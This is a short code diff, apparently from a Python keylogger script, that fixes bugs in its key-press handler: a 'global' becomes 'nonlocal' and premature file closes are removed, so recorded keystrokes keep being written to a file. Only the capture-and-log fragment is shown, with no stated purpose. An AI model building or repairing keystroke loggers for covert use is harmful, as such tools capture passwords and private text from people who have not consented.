@@ -194,7 +194,7 @@ def main():
         keys = []
 
         def on_press(key):
-            global keys, count, currentTime
+            nonlocal keys, count, currentTime
 
             keys.append(key)
             count += 1
@@ -212,11 +212,9 @@ def main():
                     k = str(key).replace("'", "")
                     if k.find("space") > 0:
                         f.write("\n")
-                        f.close()
 
                     elif k.find("key") == -1:
                         f.write(k)
-                        f.close()
 
         def on_release(key):
             try:
